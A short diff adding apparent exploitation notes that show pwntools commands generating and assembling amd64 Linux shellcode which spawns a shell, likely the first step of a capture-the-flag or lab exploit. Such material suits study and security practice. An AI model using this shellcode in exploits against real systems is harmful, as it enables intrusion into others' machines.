@@ -1,0 +1,11 @@
+first create the shell code:
+from pwn import *
+>>> context.arch = 'amd64'
+>>> shellcraft.amd64.linux.sh()
+>>> asm(shellcraft.amd64.linux.sh())
+
+
+
+
+
+
